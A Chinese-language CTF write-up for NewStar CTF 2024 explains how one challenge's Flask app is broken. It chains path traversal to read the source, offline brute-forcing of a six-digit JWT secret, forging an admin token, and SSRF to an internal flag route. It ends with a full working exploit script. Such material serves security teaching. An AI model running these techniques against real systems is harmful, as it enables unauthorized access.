---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---
# 这照片是你吗

```html
<!-- 图标能够正常显示耶! -->
<!-- 但是我好像没有看到Niginx或者Apache之类的东西 -->
<!-- 说明服务器脚本能够处理静态文件捏 -->
<!-- 那源码是不是可以用某些办法拿到呢! -->
```

很明显的提示，能够获得静态文件，但是没有用常见的反代服务来区别静态文件和服务型路由。

服务端处理文件和路由的逻辑很有可能会有漏洞。

简单的测试就能知道是路径穿越+任意文件读

查看Response Header，能够认出来是Flask app，常用的flask主程序名为为app.py

> 路径穿越常用用../，意为当前文件夹的上一层。

本题将静态文件存储在了./static中，主程序在static外，那么使用`GET /../app.py`就可以拿到源码了。

> 本题的漏洞代码是send_file("./static/" + file)
> 与SQL注入一样，直接拼接用户可控制输入的字符串是大忌！

![发包获取源代码](/assets/images/wp/2024/week3/zhaopian_1.png)

很轻松的，我们获得了主程序的源代码。

审计源码，可以知道我们要用admin用户登录来进入面板。两种方法：获取密码或者伪造token

密码的长度

```python
base_key = str(uuid.uuid4()).split("-")
admin_pass = "".join([ _ for _ in base_key])
```

admin的密码长度是32个字符，而整个程序有登录次数限制，因此无法爆破密码来登录。

伪造token需要secret_key，查看生成逻辑：

```python
secret_key = get_random_number_string(6)
```

6位数字字符串，可以在数秒内完成爆破。

```python
users = {
    'admin': admin_pass,
    'amiya': "114514"
}
```

通过本段代码我们可以知道一个有效账户amiya，密码114514，通过发包登录我们可以获得一个有效的token，据此能在本地认证签名secret_key的有效性（因为目标主机有认证次数限制）。

> 用明文存密码也是大忌！安全的做法是存储哈希值，并且加入一定的salt。

爆破出secret_key，然后查看登录后的逻辑：

前端请求execute路由=>api路由，而api链接可控且没有校验，存在SSRF漏洞。

定位到源代码开头：

```python
from flag import get_random_number_string
```

这是出题人故意漏的信息，将函数写在了flag模块并import，提示查看flag.py

> python程序可以import同一目录下的py文件而不必编写__init__.py等标记模块的文件。
>
> 文件名为flag.py的程序，模块名为flag

```python
@get_flag.route("/fl4g")
#如何触发它呢?
def flag():
    return FLAG
```

Dockerfile（未给出）压根没有Expose出5001端口，不可能通过直接访问来得到flag，那我们的操作就很明确了：

利用`/execute`的SSRF漏洞让服务器自己访问`http://localhost:5001/fl4g`

`GET /execute?api_address=http://localhost:5001/fl4g`

写出exp：

```python
import time
import requests
import jwt
import sys

if len(sys.argv) < 2:
    print(f"Usage: python {sys.argv[0]} <url>")
    sys.exit(1)
url = sys.argv[-1]
def get_number_string(number,length):
    return str(number).zfill(length)
print("[+] Exploit for newstar-zhezhaopianshinima")
print("[+] Getting a valid token from the server")
LENGTH = 6
req = requests.post(url+"/login", data={"username":"amiya","password":"114514"})
token = req.cookies.get("token")
print(f"[+] Got token: {token}")
print("[+] Brute forcing the secret key")
for i in range(1000000):
    secret_key = get_number_string(i,LENGTH)
    try:
        decoded = jwt.decode(token, secret_key, algorithms=["HS256"])
        break
    except jwt.exceptions.InvalidSignatureError:
        continue
print(f"[+] Found secret key: {secret_key}")
fake_token = jwt.encode({'user': 'admin', 'exp': int(time.time()) + 600}, secret_key)
print(f"[+] Generated a fake token: {fake_token}")
print("[+] Getting the flag")
req = requests.get(url+"/execute?api_address=http://localhost:5001/fl4g", cookies={"token":fake_token})
print(f"[+] Flag: {req.text}")
```
